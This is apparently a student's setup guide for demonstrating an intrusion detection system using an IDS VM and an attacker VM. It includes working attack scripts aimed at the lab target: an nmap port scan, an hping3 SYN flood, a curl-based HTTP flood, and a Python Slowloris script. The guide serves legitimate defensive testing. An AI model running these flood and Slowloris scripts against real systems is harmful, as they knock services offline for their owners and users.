# VM Attack Simulation Setup Guide

Complete guide for setting up VMs and simulating attacks for your IDS demo.

---

## Setup Overview

**You'll need:**
- 2 Virtual Machines (VMware or VirtualBox)
  - **VM 1: IDS Server** - Runs your IDS system
  - **VM 2: Attacker** - Simulates attacks

---

## Step 1: Install VirtualBox (Free)

**Download:**
- https://www.virtualbox.org/wiki/Downloads
- Install VirtualBox for Windows

---

## Step 2: Create IDS Server VM

**1. Create New VM:**
- Name: `IDS-Server`
- Type: Linux
- Version: Ubuntu (64-bit)
- RAM: 4GB (minimum 2GB)
- Hard disk: 20GB (dynamically allocated)

**2. Install Ubuntu:**
- Download Ubuntu 22.04 LTS: https://ubuntu.com/download/desktop
- Attach ISO to VM
- Install Ubuntu (standard installation)

**3. After Installation:**
```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install required tools
sudo apt install -y nodejs npm mongodb redis-server iptables ipset conntrack python3 python3-pip build-essential libpcap-dev

# Install MongoDB (if not in repo)
# Follow MongoDB installation guide

# Install Node.js (if version is old)
curl -fsSL https://deb.nodesource.com/setup_18.x | sudo -E bash -
sudo apt install -y nodejs

# Clone/copy your IDS project to VM
# Or use SCP/SFTP to transfer files
```

**4. Network Settings:**
- Network Adapter: **Bridged Adapter** (so it gets its own IP)
- Note the VM's IP address: `ip addr show`

---

## Step 3: Create Attacker VM

**1. Create New VM:**
- Name: `Attacker`
- Type: Linux
- Version: Ubuntu (64-bit)
- RAM: 2GB
- Hard disk: 15GB

**2. Install Ubuntu:**
- Same as above, minimal installation is fine

**3. Install Attack Tools:**
```bash
sudo apt update
sudo apt install -y nmap hping3 curl wget netcat-openbsd python3 python3-pip

# Install additional tools
pip3 install requests
```

**4. Network Settings:**
- Network Adapter: **Bridged Adapter** (same network as IDS Server)
- Note the VM's IP address

---

## Step 4: Configure IDS Server VM

**1. Transfer your IDS project:**
```bash
# Option 1: Clone from Git
git clone <your-repo-url>
cd IDS

# Option 2: Use SCP from Windows
# In Windows PowerShell:
# scp -r C:\Users\rajes\OneDrive\Desktop\Academics\Projects\Capstone\IDS username@vm-ip:/home/username/
```

**2. Set up IDS:**
```bash
cd IDS

# Backend
cd backend
npm install
npm run build

# Frontend
cd ../frontend
npm install

# Start services
cd ..
./start-demo.sh
```

**3. Note the IDS Server IP:**
```bash
ip addr show
# Note the IP (e.g., 192.168.1.100)
```

---

## Step 5: Attack Simulation Scripts

### Create Attack Scripts on Attacker VM:

**1. Port Scan Attack:**
```bash
# Create file: port_scan.sh
#!/bin/bash
TARGET=$1  # IDS Server IP
echo "Scanning $TARGET..."
nmap -p 1-1000 $TARGET
```

**2. SYN Flood Attack:**
```bash
# Create file: syn_flood.sh
#!/bin/bash
TARGET=$1
PORT=${2:-80}
echo "SYN Flood attack on $TARGET:$PORT"
hping3 -S -p $PORT --flood $TARGET
```

**3. HTTP Flood Attack:**
```bash
# Create file: http_flood.sh
#!/bin/bash
TARGET=$1
PORT=${2:-5001}
echo "HTTP Flood on http://$TARGET:$PORT"
for i in {1..1000}; do
  curl -s http://$TARGET:$PORT > /dev/null &
done
wait
```

**4. Slowloris Attack:**
```python
# Create file: slowloris.py
#!/usr/bin/env python3
import socket
import time
import sys

target = sys.argv[1]
port = int(sys.argv[2]) if len(sys.argv) > 2 else 80

sockets = []
for i in range(200):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((target, port))
        s.send(f"GET /?{i} HTTP/1.1\r\n".encode())
        s.send(f"Host: {target}\r\n".encode())
        s.send("User-Agent: Mozilla/5.0\r\n".encode())
        s.send("Accept-language: en-US,en,q=0.5\r\n".encode())
        sockets.append(s)
        print(f"Socket {i} connected")
    except Exception as e:
        print(f"Error: {e}")
        break

print(f"Keeping {len(sockets)} connections open...")
time.sleep(300)  # Keep connections open for 5 minutes
```

---

## Step 6: Demo Flow

### Scenario 1: Port Scan Detection

**On Attacker VM:**
```bash
# Scan IDS server
nmap -p 1-1000 <IDS-SERVER-IP>
```

**On IDS Server:**
- Check Monitoring tab
- Should show alerts for port scan
- IP gets auto-blocked

---

### Scenario 2: SYN Flood Attack

**On Attacker VM:**
```bash
# Start SYN flood
./syn_flood.sh <IDS-SERVER-IP> 5001
```

**On IDS Server:**
- Check Monitoring tab
- Should show high number of connections
- IP gets auto-blocked after threshold
- Show blocked IPs list

---

### Scenario 3: HTTP Flood Attack

**On Attacker VM:**
```bash
# Flood with HTTP requests
./http_flood.sh <IDS-SERVER-IP> 5001
```

**On IDS Server:**
- Check Monitoring tab
- Should show rate limit alerts
- IP gets temporarily banned
- Show in blocked IPs

---

### Scenario 4: Manual Blocking

**On IDS Server GUI:**
1. Block attacker's IP manually
2. Show "Test Access" button → "✗ Blocked"
3. Try to access from Attacker VM → Should fail

**On Attacker VM:**
```bash
# Try to access IDS server
curl http://<IDS-SERVER-IP>:5001
# Should timeout or fail
```

---

## Step 7: Visual Demonstration

**1. Show IDS Dashboard:**
- Real-time packet monitoring
- Threat alerts
- Blocked IPs

**2. Show Attack in Action:**
- Run attack from Attacker VM
- Watch IDS detect it
- Show auto-blocking

**3. Show Manual Blocking:**
- Block a domain (github.com)
- Show all IPs blocked
- Test access → Shows blocked

**4. Show Unblocking:**
- Unblock an IP
- Test access → Shows accessible
- Attacker can connect again

---

## Network Configuration

**Important: Both VMs must be on same network!**

**VirtualBox Network Settings:**
- Both VMs: **Bridged Adapter**
- This makes them appear on your local network
- They can ping each other

**Find IPs:**
```bash
# On each VM
ip addr show
# or
hostname -I
```

**Test Connectivity:**
```bash
# From Attacker VM
ping <IDS-SERVER-IP>

# Should get replies
```

---

## Quick Setup Commands

### IDS Server VM:
```bash
# Install everything
sudo apt update && sudo apt upgrade -y
sudo apt install -y nodejs npm mongodb redis-server iptables ipset conntrack python3 python3-pip build-essential libpcap-dev

# Setup project
cd ~
# Transfer your IDS project here
cd IDS/backend && npm install && npm run build
cd ../frontend && npm install

# Start
cd .. && ./start-demo.sh
```

### Attacker VM:
```bash
# Install tools
sudo apt update
sudo apt install -y nmap hping3 curl python3 python3-pip

# Create attack scripts (see above)
```

---

## Demo Script

**1. Introduction:**
- "I've set up an IDS system on this VM"
- "This other VM will simulate attacks"

**2. Show Normal Traffic:**
- Show IDS dashboard
- Explain monitoring

**3. Launch Attack:**
- Run port scan from Attacker VM
- Show detection in IDS
- Show auto-blocking

**4. Show Manual Blocking:**
- Block github.com
- Show all IPs
- Test access

**5. Show Unblocking:**
- Unblock IP
- Show it works again

---

## Troubleshooting

**VMs can't ping each other:**
- Check both use Bridged Adapter
- Check firewall rules
- Check IP addresses are on same subnet

**IDS not detecting attacks:**
- Check packet capture is running
- Check firewall rules
- Check logs: `tail -f /tmp/ids-backend.log`

**Attacks not working:**
- Check network connectivity
- Check target IP/port
- Check if IDS is blocking too aggressively

---

## Alternative: Use WSL + Windows VM

If you want to keep using WSL:
- Run IDS in WSL (as you do now)
- Create one Windows VM as attacker
- Use Windows tools (nmap for Windows, etc.)

This is simpler but less realistic for Linux-based attacks.

